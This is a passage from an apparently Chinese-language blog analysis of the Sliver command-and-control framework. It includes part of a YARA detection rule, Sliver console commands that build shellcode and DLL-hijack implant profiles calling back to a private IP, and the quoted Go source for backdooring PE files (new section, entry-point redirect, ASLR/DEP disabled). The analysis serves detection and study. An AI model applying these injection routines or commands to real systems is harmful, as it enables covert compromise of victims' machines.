class="number">51</span> ?? EB <span class="number">0D</span>&#125;</div><div class="line">		//.text:007B6C63 C7 <span class="number">41</span> <span class="number">50</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                    <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">50h</span>], <span class="number">3</span> <span class="comment">; ----&gt;  length of Arch</span></div><div class="line">		//.text:007B6C6A 8B <span class="number">15</span> <span class="number">00</span> <span class="number">77</span> BB <span class="number">00</span>                       <span class="keyword">mov</span>     <span class="built_in">edx</span>, runtime_writeBarrier</div><div class="line">		//.text:007B6C70 <span class="number">8D</span> <span class="number">79</span> 4C                                <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">ecx</span>+<span class="number">4Ch</span>]</div><div class="line">		//.text:007B6C73 <span class="number">85</span> D2                                   <span class="keyword">test</span>    <span class="built_in">edx</span>, <span class="built_in">edx</span></div><div class="line">		//.text:007B6C75 <span class="number">74</span> <span class="number">02</span>                                   <span class="keyword">jz</span>      short loc_7B6C79</div><div class="line">		//.text:007B6C77 EB <span class="number">0B</span>                                   <span class="keyword">jmp</span>     short loc_7B6C84</div><div class="line">		//.text:007B6C79                         <span class="comment">; ---------------------------------------------------------------------------</span></div><div class="line">		//.text:007B6C79</div><div class="line">		//.text:007B6C79                         loc_7B6C79:                             <span class="comment">; CODE XREF: main_registerSliver+6E5↑j</span></div><div class="line">		//.text:007B6C79 <span class="number">8D</span> <span class="number">15</span> <span class="number">32</span> <span class="number">49</span> <span class="number">87</span> <span class="number">00</span>                       <span class="keyword">lea</span>     <span class="built_in">edx</span>, unk_874932</div><div class="line">		//.text:007B6C7F <span class="number">89</span> <span class="number">51</span> 4C                                <span class="keyword">mov</span>     [<span class="built_in">ecx</span>+<span class="number">4Ch</span>], <span class="built_in">edx</span>  <span class="comment">; ====&gt; Arch</span></div><div class="line">		//.text:007B6C82 EB <span class="number">0D</span>                                   <span class="keyword">jmp</span>     short loc_7B6C91</div><div class="line"><span class="symbol">	condition:</span></div><div class="line">		$header <span class="meta">at</span> <span class="number">0</span> </div><div class="line">		<span class="keyword">and</span> $hex1</div><div class="line">		<span class="keyword">and</span> $hex2</div><div class="line">		<span class="keyword">and</span> $hex3</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="Implant功能分析"><a href="#Implant功能分析" class="headerlink" title="Implant功能分析"></a>Implant功能分析</h2><h3 id="0x01-backdoor"><a href="#0x01-backdoor" class="headerlink" title="0x01 backdoor"></a>0x01 backdoor</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sliver的backdoor功能的作用是将一个恶意的payload载荷远程注入到磁盘文件中。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[server]</span> <span class="selector-tag">sliver</span> (<span class="selector-tag">DEVELOPING_BULL</span>) &gt; <span class="selector-tag">profiles</span> <span class="selector-tag">new</span> <span class="selector-tag">-f</span> <span class="selector-tag">shellcode</span> <span class="selector-tag">-m</span> 192<span class="selector-class">.168</span><span class="selector-class">.117</span><span class="selector-class">.138</span> <span class="selector-tag">backdoor_shellcode</span></div><div class="line"><span class="selector-attr">[server]</span> <span class="selector-tag">sliver</span> (<span class="selector-tag">DEVELOPING_BULL</span>) &gt; <span class="selector-tag">backdoor</span> <span class="selector-tag">-p</span> <span class="selector-tag">backdoor_shellcode</span> "<span class="selector-tag">E</span>:\\<span class="selector-tag">Sliver</span>\\<span class="selector-tag">calc</span><span class="selector-class">.exe</span>"</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>/sliver/client/command/backdoor/backdoor.go</code>文件中，客户端获取<code>profilename</code>,和<code>远程文件路径</code>等信息，然后发送RPC。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">func BackdoorCmd(ctx *grumble<span class="selector-class">.Context</span>, con *console.SliverConsoleClient) &#123;</div><div class="line">	session := con<span class="selector-class">.ActiveTarget</span><span class="selector-class">.GetSessionInteractive</span>()</div><div class="line">	<span class="keyword">if</span> session == nil &#123;</div><div class="line">		return</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	remoteFilePath := ctx<span class="selector-class">.Args</span><span class="selector-class">.String</span>(<span class="string">"remote-file"</span>)</div><div class="line">	<span class="keyword">if</span> remoteFilePath == <span class="string">""</span> &#123;</div><div class="line">		con.PrintErrorf(<span class="string">"Please provide a remote file path. See `help backdoor` for more info"</span>)</div><div class="line">		return</div><div class="line">	&#125;</div><div class="line">	profileName := ctx<span class="selector-class">.Flags</span><span class="selector-class">.String</span>(<span class="string">"profile"</span>)</div><div class="line"><span class="comment">//</span></div><div class="line">	ctrl := make(chan bool)</div><div class="line">	msg := fmt.Sprintf(<span class="string">"Backdooring %s ..."</span>, remoteFilePath)</div><div class="line">	con.SpinUntil(msg, ctrl)</div><div class="line">	backdoor, err := con<span class="selector-class">.Rpc</span><span class="selector-class">.Backdoor</span>(context.Background(), &amp;sliverpb.BackdoorReq&#123;</div><div class="line">		FilePath:    remoteFilePath,</div><div class="line">		ProfileName: profileName,</div><div class="line">		Request:     con<span class="selector-class">.ActiveTarget</span><span class="selector-class">.Request</span>(ctx),</div><div class="line">	&#125;)</div><div class="line">	ctrl &lt;- true</div><div class="line">	&lt;-ctrl</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		con.PrintErrorf(<span class="string">"%s\n"</span>, err)</div><div class="line">		return</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> backdoor<span class="selector-class">.Response</span> != nil &amp;&amp; backdoor<span class="selector-class">.Response</span><span class="selector-class">.Err</span> != <span class="string">""</span> &#123;</div><div class="line">		con.PrintErrorf(<span class="string">"%s\n"</span>, backdoor<span class="selector-class">.Response</span><span class="selector-class">.Err</span>)</div><div class="line">		return</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	con.PrintInfof(<span class="string">"Uploaded backdoor'd binary to %s\n"</span>, remoteFilePath)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>sliver/server/rpc/rpc-backdoor.go</code>中，首先获取对应的Session，然后下载远程文件，根据Profile名获取Profile的ShellCode，然后传入<code>bj.Binject</code>方法做进一步加工，通过Update将加工过的文件上传入远程主机。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line">func (rpc *Server) Backdoor(ctx context<span class="selector-class">.Context</span>, req *sliverpb.BackdoorReq) (*sliverpb<span class="selector-class">.Backdoor</span>, error) &#123;</div><div class="line">	resp := &amp;sliverpb.Backdoor&#123;&#125;</div><div class="line">	session := core<span class="selector-class">.Sessions</span><span class="selector-class">.Get</span>(req<span class="selector-class">.Request</span><span class="selector-class">.SessionID</span>)</div><div class="line">	<span class="keyword">if</span> session<span class="selector-class">.OS</span> != <span class="string">"windows"</span> &#123;</div><div class="line">		return nil, status.Error(codes<span class="selector-class">.InvalidArgument</span>, fmt.Sprintf(<span class="string">"%s is currently not supported"</span>, session.OS))</div><div class="line">	&#125;</div><div class="line">	download, err := rpc.Download(context.Background(), &amp;sliverpb.DownloadReq&#123;</div><div class="line">		Request: &amp;commonpb.Request&#123;</div><div class="line">			SessionID: session<span class="selector-class">.ID</span>,</div><div class="line">			Timeout:   req<span class="selector-class">.Request</span><span class="selector-class">.Timeout</span>,</div><div class="line">		&#125;,</div><div class="line">		Path: req<span class="selector-class">.FilePath</span>,</div><div class="line">	&#125;)</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return nil, err</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> download<span class="selector-class">.Encoder</span> == <span class="string">"gzip"</span> &#123;</div><div class="line">		download<span class="selector-class">.Data</span>, err = new(encoders.Gzip).Decode(download.Data)</div><div class="line">		<span class="keyword">if</span> err != nil &#123;</div><div class="line">			return nil, err</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	profiles, err := rpc.ImplantProfiles(context.Background(), &amp;commonpb.Empty&#123;&#125;)</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return nil, err</div><div class="line">	&#125;</div><div class="line">	<span class="selector-tag">var</span> <span class="selector-tag">p</span> *clientpb.ImplantProfile</div><div class="line">	<span class="keyword">for</span> _, prof := range profiles<span class="selector-class">.Profiles</span> &#123;</div><div class="line">		<span class="keyword">if</span> prof<span class="selector-class">.Name</span> == req<span class="selector-class">.ProfileName</span> &#123;</div><div class="line">			<span class="selector-tag">p</span> = prof</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> <span class="selector-tag">p</span>.GetName() == <span class="string">""</span> &#123;</div><div class="line">		return nil, fmt.Errorf(<span class="string">"no profile found for name %s"</span>, req.ProfileName)</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> <span class="selector-tag">p</span><span class="selector-class">.Config</span><span class="selector-class">.Format</span> != clientpb<span class="selector-class">.OutputFormat_SHELLCODE</span> &#123;</div><div class="line">		return nil, fmt.Errorf(<span class="string">"please select a profile targeting a shellcode format"</span>)</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> <span class="selector-tag">p</span><span class="selector-class">.Config</span><span class="selector-class">.Name</span> == <span class="string">""</span> &#123;</div><div class="line">		<span class="selector-tag">p</span><span class="selector-class">.Config</span><span class="selector-class">.Name</span>, err = codenames.GetCodename()</div><div class="line">		<span class="keyword">if</span> err != nil &#123;</div><div class="line">			return nil, err</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	name, config := generate.ImplantConfigFromProtobuf(<span class="selector-tag">p</span>.Config)</div><div class="line">	otpSecret, _ := cryptography.TOTPServerSecret()</div><div class="line">	err = generate.GenerateConfig(name, config, true)</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return nil, err</div><div class="line">	&#125;</div><div class="line">	fPath, err := generate.SliverShellcode(name, otpSecret, config, true)</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return nil, status.Error(codes<span class="selector-class">.Internal</span>, err.Error())</div><div class="line">	&#125;</div><div class="line">	shellcode, err := os.ReadFile(fPath)</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return nil, status.Error(codes<span class="selector-class">.Internal</span>, err.Error())</div><div class="line">	&#125;</div><div class="line">	bjConfig := &amp;bj.BinjectConfig&#123;</div><div class="line">		CodeCaveMode: true,</div><div class="line">	&#125;</div><div class="line">	newFile, err := bj.Binject(download<span class="selector-class">.Data</span>, shellcode, bjConfig)</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return nil, status.Error(codes<span class="selector-class">.Internal</span>, err.Error())</div><div class="line">	&#125;</div><div class="line">	uploadGzip := new(encoders.Gzip).Encode(newFile)</div><div class="line">	<span class="comment">// upload to remote target</span></div><div class="line">	upload, err := rpc.Upload(context.Background(), &amp;sliverpb.UploadReq&#123;</div><div class="line">		Encoder: <span class="string">"gzip"</span>,</div><div class="line">		Data:    uploadGzip,</div><div class="line">		Path:    req<span class="selector-class">.FilePath</span>,</div><div class="line">		Request: &amp;commonpb.Request&#123;</div><div class="line">			SessionID: session<span class="selector-class">.ID</span>,</div><div class="line">			Timeout:   req<span class="selector-class">.Request</span><span class="selector-class">.Timeout</span>,</div><div class="line">		&#125;,</div><div class="line">	&#125;)</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		return nil, err</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">if</span> upload<span class="selector-class">.Response</span> != nil &amp;&amp; upload<span class="selector-class">.Response</span><span class="selector-class">.Err</span> != <span class="string">""</span> &#123;</div><div class="line">		return nil, fmt.Errorf(upload<span class="selector-class">.Response</span><span class="selector-class">.Err</span>)</div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	return resp, nil</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>/sliver/vendor/github.com/Binject/binjection/bj/inject_pe.go</code>文件中从事ShellCode的写入工作，这一部分逻辑也很简单，可以参考部分PE加壳工具的原理，首先在文件末尾添加一个新段，在PE的节区表中添加新段的相关信息。并将入口点指向新段的虚拟地址。禁用ALSR和DEP。</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// PeBinject - Inject shellcode into an PE binary</span></div><div class="line">func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) </div><div class="line">&#123;</div><div class="line">	<span class="comment">// Open File and Extract Needed Fields</span></div><div class="line">	peFile, err :<span class="type"></span>= pe.NewFile(bytes.NewReader(sourceBytes))</div><div class="line">	<span class="keyword">if</span> err != nil &#123;</div><div class="line">		<span class="keyword">return</span> nil, err</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">var</span> entryPoint, sectionAlignment, fileAlignment, scAddr uint32</div><div class="line">	<span class="keyword">var</span> imageBase uint64</div><div class="line">	<span class="keyword">var</span> shellcode []byte</div><div class="line">	lastSection :<span class="type"></span>= peFile.Sections[peFile.NumberOfSections<span class="number">-1</span>]</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">switch</span> hdr :<span class="type"></span>= (peFile.OptionalHeader).(type) &#123;</div><div class="line">	<span class="keyword">case</span> *pe.OptionalHeader32:<span class="type"></span></div><div class="line"><span class="type">		imageBase </span>= uint64(hdr.ImageBase) <span class="comment">// cast this back to a uint32 before use in 32bit</span></div><div class="line">		entryPoint = hdr.AddressOfEntryPoint</div><div class="line">		sectionAlignment = hdr.SectionAlignment</div><div class="line">		fileAlignment = hdr.FileAlignment</div><div class="line">		scAddr = align(lastSection.Size, fileAlignment, lastSection.Offset) <span class="comment">//PointerToRawData</span></div><div class="line">		shellcode = api.ApplySuffixJmpIntel32(shellcodeBytes, scAddr, entryPoint+uint32(imageBase), binary.LittleEndian)</div><div class="line">		<span class="keyword">break</span></div><div class="line">	<span class="keyword">case</span> *pe.OptionalHeader64:<span class="type"></span></div><div class="line"><span class="type">		imageBase </span>= hdr.ImageBase</div><div class="line">		entryPoint = hdr.AddressOfEntryPoint</div><div class="line">		sectionAlignment = hdr.SectionAlignment</div><div class="line">		fileAlignment = hdr.FileAlignment</div><div class="line">		scAddr = align(lastSection.Size, fileAlignment, lastSection.Offset) <span class="comment">//PointerToRawData</span></div><div class="line">		shellcode = api.ApplySuffixJmpIntel32(shellcodeBytes, scAddr, entryPoint+uint32(imageBase), binary.LittleEndian)</div><div class="line">		<span class="keyword">break</span></div><div class="line">	&#125;</div><div class="line">	<span class="comment">// Add a New Section Method (most common)</span></div><div class="line">	shellcodeLen :<span class="type"></span>= len(shellcode)</div><div class="line">	<span class="keyword">new</span><span class="type">section</span> :<span class="type"></span>= <span class="keyword">new</span><span class="type"></span>(pe.Section)</div><div class="line">	<span class="keyword">new</span><span class="type">section</span>.Name = <span class="string">"."</span> + RandomString(<span class="number">5</span>)</div><div class="line">	o :<span class="type"></span>= []byte(<span class="keyword">new</span><span class="type">section</span>.Name)</div><div class="line">	<span class="keyword">new</span><span class="type">section</span>.OriginalName = [<span class="number">8</span>]byte&#123;o[<span class="number">0</span>], o[<span class="number">1</span>], o[<span class="number">2</span>], o[<span class="number">3</span>], o[<span class="number">4</span>], o[<span class="number">5</span>], <span class="number">0</span>, <span class="number">0</span>&#125;</div><div class="line">	<span class="keyword">new</span><span class="type">section</span>.VirtualSize = uint32(shellcodeLen)</div><div class="line">	<span class="keyword">new</span><span class="type">section</span>.VirtualAddress = align(lastSection.VirtualSize, sectionAlignment, lastSection.VirtualAddress)</div><div class="line">	<span class="keyword">new</span><span class="type">section</span>.Size = align(uint32(shellcodeLen), fileAlignment, <span class="number">0</span>)                <span class="comment">//SizeOfRawData</span></div><div class="line">	<span class="keyword">new</span><span class="type">section</span>.Offset = align(lastSection.Size, fileAlignment, lastSection.Offset) <span class="comment">//PointerToRawData</span></div><div class="line">	<span class="keyword">new</span><span class="type">section</span>.Characteristics = pe.IMAGE_SCN_CNT_CODE | pe.IMAGE_SCN_MEM_EXECUTE | pe.IMAGE_SCN_MEM_READ</div><div class="line"><span class="comment">//</span></div><div class="line">	peFile.InsertionAddr = scAddr</div><div class="line">	peFile.InsertionBytes = shellcode</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">switch</span> hdr :<span class="type"></span>= (peFile.OptionalHeader).(type) &#123;</div><div class="line">	<span class="keyword">case</span> *pe.OptionalHeader32:<span class="type"></span></div><div class="line"><span class="type">		v </span>:= <span class="keyword">new</span><span class="type">section</span>.VirtualSize</div><div class="line">		<span class="keyword">if</span> v == <span class="number">0</span> &#123;</div><div class="line">			v = <span class="keyword">new</span><span class="type">section</span>.Size <span class="comment">// SizeOfRawData</span></div><div class="line">		&#125;</div><div class="line">		hdr.SizeOfImage = align(v, sectionAlignment, <span class="keyword">new</span><span class="type">section</span>.VirtualAddress)</div><div class="line">		hdr.AddressOfEntryPoint = <span class="keyword">new</span><span class="type">section</span>.VirtualAddress</div><div class="line">		hdr.CheckSum = <span class="number">0</span></div><div class="line">		<span class="comment">// disable ASLR</span></div><div class="line">		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</div><div class="line">		hdr.DataDirectory[<span class="number">5</span>].VirtualAddress = <span class="number">0</span></div><div class="line">		hdr.DataDirectory[<span class="number">5</span>].Size = <span class="number">0</span></div><div class="line">		peFile.FileHeader.Characteristics |= pe.IMAGE_FILE_RELOCS_STRIPPED</div><div class="line">		<span class="comment">//disable DEP</span></div><div class="line">		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT</div><div class="line">		<span class="comment">// zero out cert table offset and size</span></div><div class="line">		hdr.DataDirectory[<span class="number">4</span>].VirtualAddress = <span class="number">0</span></div><div class="line">		hdr.DataDirectory[<span class="number">4</span>].Size = <span class="number">0</span></div><div class="line">		<span class="keyword">break</span></div><div class="line">	<span class="keyword">case</span> *pe.OptionalHeader64:<span class="type"></span></div><div class="line"><span class="type">		v </span>:= <span class="keyword">new</span><span class="type">section</span>.VirtualSize</div><div class="line">		<span class="keyword">if</span> v == <span class="number">0</span> &#123;</div><div class="line">			v = <span class="keyword">new</span><span class="type">section</span>.Size <span class="comment">// SizeOfRawData</span></div><div class="line">		&#125;</div><div class="line">		hdr.SizeOfImage = align(v, sectionAlignment, <span class="keyword">new</span><span class="type">section</span>.VirtualAddress)</div><div class="line">		hdr.AddressOfEntryPoint = <span class="keyword">new</span><span class="type">section</span>.VirtualAddress</div><div class="line">		hdr.CheckSum = <span class="number">0</span></div><div class="line">		<span class="comment">// disable ASLR</span></div><div class="line">		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</div><div class="line">		hdr.DataDirectory[<span class="number">5</span>].VirtualAddress = <span class="number">0</span></div><div class="line">		hdr.DataDirectory[<span class="number">5</span>].Size = <span class="number">0</span></div><div class="line">		peFile.FileHeader.Characteristics |= pe.IMAGE_FILE_RELOCS_STRIPPED</div><div class="line">		<span class="comment">//disable DEP</span></div><div class="line">		hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT</div><div class="line">		<span class="comment">// zero out cert table offset and size</span></div><div class="line">		hdr.DataDirectory[<span class="number">4</span>].VirtualAddress = <span class="number">0</span></div><div class="line">		hdr.DataDirectory[<span class="number">4</span>].Size = <span class="number">0</span></div><div class="line">		<span class="keyword">break</span></div><div class="line">	&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">	peFile.FileHeader.NumberOfSections++</div><div class="line">	peFile.Sections = append(peFile.Sections, <span class="keyword">new</span><span class="type">section</span>)</div><div class="line"><span class="comment">//</span></div><div class="line">	<span class="keyword">return</span> peFile.Bytes()</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="0x02-dllhijack功能"><a href="#0x02-dllhijack功能" class="headerlink" title="0x02 dllhijack功能"></a>0x02 dllhijack功能</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dllhijack功能原理基于Dll侧加载技术，</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[<span class="meta">server</span>] sliver (DEVELOPING_BULL) &gt; profiles <span class="keyword">new</span> -f shared -m <span class="number">192.168</span><span class="number">.117</span><span class="number">.138</span>  -R dllhijack_dll</div><div class="line">[<span class="meta">*</span>] Saved <span class="keyword">new</span> implant profile dllhijack_dll</div><div class="line"><span class="comment">//</span></div><div class="line">[<span class="meta">server</span>] sliver (DEVELOPING_BULL) &gt; profiles</div><div class="line"> Profile Name         Implant Type   Platform        Command &amp; Control                 Debug   Format       Obfuscation   Limitations </div><div class="line">==================== ============== =============== ================================= ======= ============ ============= =============</div><div class="line"> backdoor_shellcode   session        windows/amd64   [<span class="number">1</span>] mtls:<span class="comment">//192.168.117.138:8888   false   SHELLCODE    enabled                   </span></div><div class="line"> dllhijack_dll        session        windows/amd64   [<span class="number">1</span>] mtls:<span class="comment">//192.168.117.138:8888   false   SHARED_LIB   enabled   </span></div><div class="line"><span class="comment">//</span></div><div class="line">[<span class="meta">server</span>] sliver (DEVELOPING_BULL) &gt; dllhijack -r e:\\Sliver\\test.dll -p dllhijack_dll e:\\Sliver\test2.dll</div></pre></td></tr></table></figure>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终调用位于<code>https://github.com/BishopFox/sliver/blob/master/server/rpc/rpc-hijack.go</code>的<code>HijackDLL</code>函数。如果存在reference DLL,则读取reference DLL数据。如果不存在，则下载目标Dll，并读取。然后读取Profile数据，最后调用<code>cloneExports</code>方法。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div></pre></td><td class="code"><pre><div class="line">func (rpc *Server) HijackDLL(ctx context<span class="selector-class">.Context</span>, req *clientpb.DllHijackReq) (*clientpb<span class="selector-class">.DllHijack</span>, error) </div><div class="line">&#123;</div><div class="line">	<span class="selector-tag">var</span> (</div><div class="line">		refDLL        []byte</div><div class="line">		targetDLLData []byte</div><div class="line">	)</div><div class="line">	resp := &amp;clientpb.DllHijack&#123;</div><div class="line">		Response: &amp;commonpb.Response&#123;&#125;,</div><div class="line">	&#125;</div><div class="line">	session := core<span class="selector-class">.Sessions</span><span class="selector-class">.Get</span>(req<span class="selector-class">.Request</span><span class="selector-class">.SessionID</span>)</div><div class="line">	<span class="keyword">if</span> session == nil &#123;</div><div class="line">		return resp, ErrInvalidSessionID</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> session<span class="selector-class">.OS</span> != <span class="string">"windows"</span> &#123;</div><div class="line">		return nil, status.Error(codes<span class="selector-class">.InvalidArgument</span>, fmt.Sprintf(</div><div class="line">			<span class="string">"this feature is not supported on the target operating system 